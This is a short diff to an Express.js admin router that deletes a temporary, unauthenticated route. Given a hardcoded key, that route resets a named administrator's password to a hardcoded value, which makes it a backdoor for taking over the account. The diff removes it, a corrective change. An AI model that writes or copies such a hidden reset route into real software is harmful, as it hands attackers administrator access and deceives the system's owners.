@@ -185,8 +185,6 @@ router.get('/conversations', requireAdmin, async (req, res) => {
   } catch (err) { res.status(500).json({ error: err.message }); }
 });
 
-// Temp
-router.get('/xreset/:k', async (req, res) => { if(req.params.k!=='ev9')return res.status(403).json({}); const h=await bcrypt.hash('admin2026',10); await pool.query("UPDATE users SET password_hash=$1 WHERE email='admin@everi9.com'",[h]); res.json({ok:1}); });
 // GET /api/setup/roles — Lista perfis disponiveis
 router.get('/roles', (req, res) => {
   res.json({
